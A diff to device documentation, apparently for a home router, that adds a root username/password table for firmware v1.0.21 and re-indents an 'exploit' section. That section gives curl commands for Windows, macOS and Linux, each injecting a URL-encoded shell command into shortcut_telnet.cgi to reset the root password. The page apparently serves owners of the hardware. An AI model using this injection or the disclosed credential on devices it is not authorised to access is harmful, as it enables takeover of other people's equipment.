@@ -226,34 +226,37 @@ of every one of us.
 
 === "v1.0.21"
 
-    !!! warning "The root password is not known at this time"
+    | Username | Password       |
+    | -------- | -------------- |
+    | root     | M533%27#32n682 |
 
-    ???+ bug "Exploit to temporarily change the root password"
-        Run the following command to temporarily change the root password to `root`.
 
-        === ":fontawesome-brands-windows: Windows"
+???+ bug "Exploit to temporarily change the root password"
+    Run the following command to temporarily change the root password to `root`.
 
-            ``` sh
-            curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-            ```
+    === ":fontawesome-brands-windows: Windows"
 
-        === ":material-apple: macOS"
+        ``` sh
+        curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
 
-            !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
+    === ":material-apple: macOS"
 
-            ``` sh
-            brew install curl
-            curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-            ```
+        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
 
-        === ":material-linux: Linux"
+        ``` sh
+        brew install curl
+        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
 
-            !!! note "The following commands assume a Debian-based distribution, such as [Ubuntu](https://ubuntu.com/)"
+    === ":material-linux: Linux"
 
-            ``` sh
-            sudo apt-get install curl
-            curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-            ```
+        !!! note "The following commands assume a Debian-based distribution, such as [Ubuntu](https://ubuntu.com/)"
+
+        ``` sh
+        sudo apt-get install curl
+        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
 
 ### Local upgrade
 
